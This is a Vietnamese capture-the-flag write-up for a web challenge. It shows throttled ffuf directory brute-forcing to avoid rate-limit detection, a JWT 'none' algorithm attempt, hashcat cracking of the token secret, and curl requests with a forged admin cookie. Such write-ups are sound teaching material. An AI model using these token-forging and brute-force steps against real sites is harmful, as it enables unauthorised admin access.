# Hay dao choi va thanh admin  



## Thông tin về challenge:  

**- Author:** Mèo Bếu  
**- Tags:**  
**- Description:** Một thử thách đơn giản, trở thành Admin của trang web và bạn có thể làm bất cứ điều gì bạn muốn.
Chúc mọi người vượt qua thử thách hehehe  
**- Hint:**  
**- Link:** https://notadmin.fia.io.vn/  

## Cách giải:  
### Trước khi giải, chúng ta cần:  
- Ffuf  
- Seclist  
### Bước 1: Sử dụng ffuf cùng với seclists để bruteforce directories của link challenge.  
Đầu tiên sử dụng common list có sẵn của seclists để tìm những directories phổ biến.  
```
  ffuf -u https://notadmin.fia.io.vn/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -o output.txt
```
![image](https://github.com/user-attachments/assets/cb36e35c-5684-4b5f-8aa3-272c458b7ede)  
Như ta có thể thấy, đa số status là 429, có nghĩa là quá nhiều request trong 1 giây. Có vẻ server đã limit lại để tránh automated request.  
Chúng ta sẽ dùng lại ffuf, nhưng làm chậm tốc độ của nó lại còn 10 request 1 giây để tránh bị phát hiện.
```
  ffuf -u https://notadmin.fia.io.vn/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -rate 10 -mc all -o output.txt
```
Sau khi "grep -v "404" result.txt", có 2 directoris chúng ta cần lưu ý, dó là admin và robots.txt.  
Tiếp theo cùng đến với bước 2.
### Bước 1 (cách khác): Rùa ![image](https://github.com/user-attachments/assets/286e50ef-7ef2-4bb8-bfc4-29ee68b2ab82) 
** Đây là cách lúc đầu mình dùng để giải, hên hên được luôn   **
Đầu tiên test https://notadmin.fia.io.vn/robots.txt theo phản xạ  
Vì đề tên là trở thành admin, nên thử https://notadmin.fia.io.vn/admin luôn 

### Bước 2:
- Thử truy cập https://notadmin.fia.io.vn/admin, nhưng ta được "YOU DO NOT HAVE PERMISSION TO ACCESS THIS PAGE" và bị redirect về trang chính.  
  Có vẻ như chúng ta không có quyền admin để truy cập.  
- Thử truy cập https://notadmin.fia.io.vn/robots.txt, ta được:   
 User-agent: *
Disallow: /s3cr3t-p@ssw0rd
- Bằng gợi ý đó, ta tiếp tục truy cập https://notadmin.fia.io.vn/s3cr3t-p@ssw0rd. Ta được 1 danh sách password siêu dài.

#### Bằng tất cả những thông tin trên, ta liền nghĩ tới lỗ hổng bảo mật JWT.
Chúng ta đến với bước 3.

### Bước 3: Lấy JWT và bắt đầu tấn công.
- Lấy JWT bằng F12 -> Application -> token -> value  
![image](https://github.com/user-attachments/assets/3736cada-da0a-4119-865d-ca35f60b7ced)
#### Đầu tiên chúng ta sẽ thử "None Algorithm Attack".
- Copy token đó và truy cập token.dev.
- Chỉnh algorithm thành none.
- Sửa is_admin thành true.  
 ![image](https://github.com/user-attachments/assets/0e35f4a8-8e8f-401e-ad68-36eb19884fb3)


- Copy token mới và paste lại vào chỗ token trên web.(Nhớ thêm dấu chấm cuối token để làm nó vẫn valid).
- Thử truy cập lại https://notadmin.fia.io.vn/admin, ta vẫn chưa có quyền admin, vậy là cách này đã thất bại.
#### Tiếp theo chúng ta thử "Weak Secret Brute-Force".
- Ta được một danh sách password siêu dài ở bước 2, có thể dó là gợi ý để bruteforce secret bằng danh sách đó.  
- Ta có thể dùng jwt-cracker, hashcat hoặc john để crack jwt.  
- Mình sẽ dùng hashcat:
  ```
  hashcat -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6ZmFsc2UsImV4cCI6MTczOTYxNzI0M30.JXLMnn4x-JtbozcIW8E67P1flMorrm4aSg0GOPXngAU balls.txt
  ```
- Khi chạy xong, ta được secretkey: "MeoBeu8ecb636c"
  ![image](https://github.com/user-attachments/assets/98ee3747-bf3f-4f99-9984-0c15040e1067)
- Chúng ta cùng chuyển đến bước 4.

  ### Bước 4: Dùng secret key để trở thành admin.
  - Ta đã có được token và secret key, truy cập jwt.io để thay secret key thành "MeoBeu8ecb636c", is_admin thành true.
    ![image](https://github.com/user-attachments/assets/036af924-2394-430a-9bc4-4d727431617c)
  - Thử truy cập lại https://notadmin.fia.io.vn/admin, ta được 1 cái logo FIA cùng chữ gì đó nhưng redirect rất nhanh về trang home.
  - Thử curl để lấy nội dung của trang đó trước khi redirect.
    ```
    curl -X GET "https://notadmin.fia.io.vn/admin" -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZSwiZXhwIjoxNzM5NjE3MjQzfQ.kQnEFRUOptX4-EWj7UaHdi8c8GmwKSp4B2UnpswpP9k"
    ```
  - Ta được một đoạn đáng chú ý như sau:
    ![image](https://github.com/user-attachments/assets/ea66cdb0-acf6-4155-8e47-6d259e7daacf)
  - Lấy " TGV0cyBjcmVhdGUgYSBQT1NUIHJlcXVlc3QgdG8gL2FkbWluIHdpdGggSlNPTiBmb3JtYXQgImhhY2tlcj1NZW9CZXVJc0hlcmUi" lên cyberchef.io.
    ![image](https://github.com/user-attachments/assets/018d67fc-70bc-4e14-be77-ad2a8e0b2276)
  - Được hint "Lets create a POST request to /admin with JSON format "hacker=MeoBeuIsHere"". Ta sẽ sửa lại curl như sau:
    ```
    curl -X POST "https://notadmin.fia.io.vn/admin" -H "Content-Type: application/json" -H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc19hZG1pbiI6dHJ1ZSwiZXhwIjoxNzM5NjE3MjQzfQ.kQnEFRUOptX4-EWj7UaHdi8c8GmwKSp4B2UnpswpP9k" -d "{\"hacker\": \"MeoBeuIsHere\"}"
    ```
![image](https://github.com/user-attachments/assets/66fc4bea-16bd-4652-b7bf-491ed9bbb49c)

## Ta được flag: "FIA{you_cracked_jwt_and_captured_the_request}"

    

















